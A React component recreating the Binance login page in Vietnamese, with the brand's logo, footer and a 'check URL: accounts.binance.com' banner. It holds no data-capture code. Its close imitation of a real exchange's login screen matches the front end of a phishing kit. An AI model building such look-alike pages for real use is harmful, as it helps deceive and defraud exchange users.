import React from 'react';
import binancelogo from "../assets/logo/images/brand.png";
import googlelogo from "../assets/logo/google_300221.png";
import applelogo from "../assets/logo/apple_220220.png";
import { GlobeAltIcon, SunIcon } from '@heroicons/react/solid'; // Импортируем иконки Heroicons
import { Link } from 'react-router-dom';

const LoginPage = () => {
  return (
    <div className="flex flex-col items-center justify- min-h-screen bg-binanceBackground">
      <div className="w-full max-w-lg px-4 py-8 space-y-8 bg-binanceBackground rounded-lg shadow-md">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center">
            <img src={binancelogo} alt="Binance Logo" className="h-8" />
            <span className="ml-2 text-yellow-500 text-start text-2xl font-bold">BINANCE</span>
          </div>
          <div className="flex space-x-2">
            <GlobeAltIcon className="h-5 w-5 text-white" />
            <SunIcon className="h-5 w-5 text-white" />
          </div>
        </div>
        <div className="bg-yellow-900 text-center text-white py-1 rounded">
          Kiểm tra URL: <span className="text-green-500">https://accounts.binance.com</span>
        </div>
        <h2 className="mt-6 text-start text-3xl font-bold text-white">Đăng nhập</h2>
        <form className="mt-8 space-y-6">
          <div className="rounded-md shadow-sm -space-y-px">
            <div>
              <label htmlFor="email" className="block text-white">Email / Số điện thoại</label>
              <input
                id="email"
                name="email"
                type="email"
                autoComplete="email"
                required
                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-700 bg-binanceBackground placeholder-neutral-900 text-white rounded-t-md focus:outline-none"
                placeholder=""
              />
            </div>
          </div>
          <div>
            <Link to={'/wallet'}>
              <button
                type="submit"
                className="group relative w-full flex justify-center py-3 px-4 border border-transparent text-md font-medium rounded-md text-black bg-yellow-500 hover:bg-yellow-600 focus:outline-none"
              >
                Đăng nhập
              </button>
            </Link>
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-2 bg-gray-800 text-gray-400 rounded-sm">hoặc</span>
          </div>
          <div className="flex flex-col space-y-3">
            <button
              type="button"
              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none"
            >
              <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                <img src={googlelogo} alt="Google" className="h-5 w-5" />
              </span>
              Tiếp tục với Google
            </button>
            <button
              type="button"
              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none"
            >
              <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                <img src={applelogo} alt="Apple" className="h-5 w-5" />
              </span>
              Tiếp tục với Apple
            </button>
          </div>
          <div className="text-center">
            <a href="#" className="font-medium text-yellow-500 hover:text-yellow-400">
              Tạo tài khoản Binance
            </a>
          </div>
        </form>
      </div>
      <div className="mt-6 text-gray-500 text-center">
        Binance © 2024 • <a href="#" className="text-yellow-500 hover:text-yellow-400">Cài đặt cookie</a>
      </div>
    </div>
  );
};

export default LoginPage;